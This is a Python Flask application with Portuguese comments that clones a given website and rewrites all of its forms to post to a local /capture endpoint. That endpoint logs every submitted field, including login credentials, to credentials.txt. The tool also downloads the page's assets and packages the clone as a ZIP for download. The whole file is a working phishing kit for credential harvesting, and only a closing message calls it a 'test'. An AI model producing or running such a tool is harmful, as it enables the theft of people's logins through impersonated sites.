import os
import zipfile
import requests
from flask import Flask, request, send_file, render_template_string
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

app = Flask(__name__)

# Diretório onde os sites serão armazenados
SAVE_DIR = "cloned_sites"
if not os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR)

def download_file(url, folder):
    """Baixa arquivos como CSS, JS e imagens."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            filename = os.path.join(folder, os.path.basename(urlparse(url).path))
            with open(filename, "wb") as file:
                file.write(response.content)
            return filename
        return None
    except Exception as e:
        print(f"Erro ao baixar arquivo {url}: {e}")
        return None

def download_and_modify(url):
    """Baixa a página, altera formulários e salva localmente."""
    try:
        response = requests.get(url)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, "html.parser")

        # Verificar se há formulários de login
        forms = soup.find_all("form")
        if not forms:
            return "O site não possui formulários de login."

        # Modificar todos os formulários para capturar credenciais
        for form in forms:
            form["action"] = "/capture"  # Redireciona para nosso script
            form["method"] = "post"  # Garante que o método seja POST

            # Adicionar um campo oculto para identificar a origem
            hidden_input = soup.new_tag("input", attrs={
                "type": "hidden",
                "name": "source_url",
                "value": url
            })
            form.append(hidden_input)

        # Corrigir links relativos e baixar recursos adicionais (CSS, JS, Imagens)
        for tag in soup.find_all(["link", "script", "img"]):
            src_attr = "src" if tag.name != "link" else "href"
            if tag.get(src_attr):
                resource_url = urljoin(url, tag[src_attr])
                file_path = download_file(resource_url, SAVE_DIR)
                if file_path:
                    tag[src_attr] = os.path.basename(file_path)

        # Salvar o site modificado
        file_path = os.path.join(SAVE_DIR, "index.html")
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(str(soup))

        # Compactar o site em um arquivo ZIP
        zip_filename = f"{SAVE_DIR}.zip"
        with zipfile.ZipFile(zip_filename, "w") as zipf:
            for root, _, files in os.walk(SAVE_DIR):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), SAVE_DIR))

        return zip_filename

    except requests.RequestException as e:
        return f"Erro ao baixar o site: {str(e)}"

@app.route("/", methods=["GET", "POST"])
def index():
    """Página inicial para inserir a URL."""
    if request.method == "POST":
        url = request.form["url"]
        zip_file = download_and_modify(url)
        if "Erro" in zip_file:
            return f"<p>{zip_file}</p><a href='/'>Tentar novamente</a>"
        return f"Site clonado! <a href='/download'>Baixar o site clonado</a>"

    return '''
        <h2>Ferramenta de Clonagem de Sites</h2>
        <form method="post">
            <input type="text" name="url" placeholder="Digite a URL" required>
            <button type="submit">Clonar</button>
        </form>
    '''

@app.route("/download")
def download():
    """Disponibiliza o arquivo ZIP para download."""
    zip_path = f"{SAVE_DIR}.zip"
    if os.path.exists(zip_path):
        return send_file(zip_path, as_attachment=True)
    return "Arquivo não encontrado."

@app.route("/capture", methods=["POST"])
def capture():
    """Captura e salva as credenciais."""
    with open("credentials.txt", "a") as file:
        file.write(str(request.form) + "\n")
    return "Dados capturados! Teste finalizado."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
